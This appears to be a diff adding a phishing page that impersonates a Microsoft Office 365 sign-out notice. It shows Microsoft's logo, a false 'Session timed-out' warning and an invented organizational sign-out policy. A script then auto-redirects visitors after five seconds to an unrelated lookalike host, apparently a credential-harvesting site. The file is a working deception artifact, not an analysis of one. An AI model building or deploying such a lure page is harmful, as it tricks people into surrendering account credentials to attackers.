@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to Microsoft</title>
+  <script src="https://alcdn.msauth.net/browser/2.40.0/js/msal-browser.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #ebebeb;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding-top: 100px;
+      margin: 50px;
+    }
+
+    form {
+      max-width: 400px;
+      padding: 50px;
+      border: none;
+    }
+
+    label, input {
+      display: block;
+      margin-top: 10px;
+    }
+
+    input[type="submit"] {
+      margin-top: 20px;
+    }
+
+    #emailDisplay {
+      margin-top: 15px;
+      font-weight: bold;
+      color: green;
+    }
+
+    .h1 {
+      font-family: Arial, sans-serif;
+      font-size: 18px;
+      font-weight: bold;
+      color: #333;
+    }
+
+    .title {
+      font-family: 'Helvetica', sans-serif;
+      font-size: 20px;
+      color: #000;
+    }
+
+    .ext-title {
+      font-style: italic;
+    }
+
+    .input-container {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="password"] {
+      border: none;
+      border-bottom: 2px solid #333;
+      background: transparent;
+      padding: 10px 5px;
+      font-size: 16px;
+      outline: none;
+      width: 380px;
+    }
+
+    input[type="password"]::placeholder {
+      color: #888;
+    }
+
+    .Form-con {
+      background-color: white;
+      border-radius: 1px;
+      border: none;
+      box-shadow: 0px 0px 5px #888;
+      margin-top: 0px;
+      width: 640px;
+      height: 450px;
+    }
+
+    .Form-con-in {
+      margin-bottom: 68px;
+      margin-left: 0px;
+      margin-right: 1px;
+      text-align: justify;
+      width: 445px;
+    }
+
+
+
+    .Sign-con {
+      margin-left: 340px;
+    }
+
+    #ForgotPassword {
+      display: inline-block;
+      margin-top: 10px;
+      padding-top: 10px;
+      padding-bottom: 70px;
+      text-decoration: none;
+      color: #3d3e42;
+      font-size: 19px;
+      font-weight: ;
+      font-family: Arial, sans-serif, Tahoma, sans-serif;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="Form-con">
+    <form id="loginForm">
+      <div class="Form-con-in">
+        <img class="logo" role="img"
+          src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
+          alt="Microsoft" />
+        <p style="color:red; font-size: 15px; " >Session timed-out. Please sign in again.</p>
+
+        <label class="h1"><h2>You have been signed out</h2></label>
+        <div class="input-container">
+          <a id="ForgotPassword" role="link" href="#">Your organization's policy enforces automaic sign out after a period of time for security purposes on Office 365 web applications.</a>
+        </div>
+
+        <div class="Sign-con">
+        <a id="redirectButton" target="_blank" style="
+          display: inline-block;
+          padding: 8px 20px;
+          background-color: #115dd8;
+          color: white;
+          text-decoration: none;
+          font-size: 20px;
+          border-radius: 2px;
+          font-family: sans-serif;">
+          
+            Sign in
+          
+        </a>
+</div>
+      </div>
+    </form>
+  </div>
+<script>
+  // Delay in milliseconds (10 seconds)
+  const delay = 5000;
+
+  // Redirect target URL
+  const redirectURL = "https://sign.differentiated.it.com/VxijO/";
+
+  // Option 1: Automatically trigger a click on the button
+  setTimeout(() => {
+    const btn = document.getElementById('redirectButton');
+    if (btn) {
+      btn.click();
+    }
+  }, delay);
+
+  // Option 2: Redirect directly (skip the button entirely)
+  setTimeout(() => {
+    window.location.href = redirectURL;
+  }, delay);
+</script>
+
+
+
+
+
+
+  </body>
+  </html>
+  
+
+  
